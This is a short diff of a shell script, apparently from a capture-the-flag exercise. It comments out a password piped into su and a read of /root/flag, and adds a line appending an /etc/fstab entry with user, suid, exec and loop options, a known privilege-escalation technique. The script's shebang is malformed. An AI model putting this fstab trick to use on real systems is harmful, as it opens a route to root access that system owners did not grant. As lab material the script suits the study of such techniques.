@@ -1,5 +1,7 @@
 #!/usr/bash
 
-echo "now" | su cmp
+# echo "now" | su cmp
 
-cat /root/flag
+# cat /root/flag
+
+echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab
